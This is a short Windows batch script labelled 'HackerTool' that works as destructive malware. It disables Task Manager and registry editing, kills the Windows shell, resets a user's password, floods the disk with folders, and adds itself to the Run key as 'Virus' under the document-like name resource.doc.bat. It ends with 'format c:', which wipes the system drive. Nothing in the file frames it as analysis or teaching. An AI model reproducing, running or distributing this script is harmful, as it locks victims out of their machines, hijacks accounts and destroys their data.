@echo off
MSG * Starte HackerTool to %username% at %date%
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /d "1"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /d "1"
taskkill /F /IM explorer.exe
net user %user% hackerpassword
for /L %%N IN (1, 1, 100) DO mkdir MyName%%N 
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Virus" /d "%cd%\resource.doc.bat" 
format c:












